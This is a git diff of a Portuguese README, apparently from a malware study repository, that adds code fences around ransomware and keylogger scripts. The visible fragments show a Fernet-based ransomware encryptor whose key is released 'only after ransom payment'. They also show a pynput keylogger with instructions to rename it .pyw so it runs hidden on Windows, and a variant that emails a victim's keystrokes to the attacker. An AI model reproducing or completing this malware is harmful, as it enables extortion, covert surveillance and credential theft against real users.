@@ -11,9 +11,9 @@ Utilizei os mesmos scripts no VSCode para as duas técnicas.
 ## Malware - Ransomware: Criptografar ##
 
 > Script para que os dados de alguns arquivos sejam criptografados através de uma chave e somente após o pagamento de resgate, a chave é informada para descriptografar esses dados.
->
-> 
 
+
+```
 from cryptography.fernet import Fernet
 import os
 
@@ -74,11 +74,12 @@ def main():
 
 if __name__ == "__main__":
     main()
-
+```
     -----------------------------------------
     
 ## Malware - Ransomware: Descriptografar ##
 
+```
 from cryptography.fernet import Fernet
 import os  
 
@@ -111,7 +112,7 @@ def main():
 
 if __name__ == "__main__":
     main()
-
+```
     --------------------------------------
 
 ## Malware - Keylogger: ##
@@ -131,6 +132,7 @@ Instalar a lib (biblioteca) no VSCode:
 
 > * CÓDIGO: * <
 
+```
 from pynput import keyboard
 
 IGNORAR = {
@@ -170,7 +172,7 @@ def on_press(key):
                     f.write(f"[{key}]")
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
-
+```
 
 NO WINDOWS, PARA FICAR INVISÍVEL, RENOMEAMOS O NOME DO ARQUIVO COM A EXTENSÃO .PYW
 EXEMPLO: keylogger.pyw 
@@ -182,6 +184,7 @@ Dessa forma, fica em modo FURTIVO sem a necessidade de Terminal aberto.
     
 *KEYLOGGER E-MAIL > Registra tudo o que é digitado na máquina da vítima e envia automaticamente para o email informado do atacante.
 
+```
 from pynput import keyboard
 import smtplib
 from email.mime.text import MIMEText
@@ -238,3 +241,4 @@ def on_press(key):
 with keyboard.Listener(on_press=on_press) as listener:
     enviar_email()
     listener.join()
+```
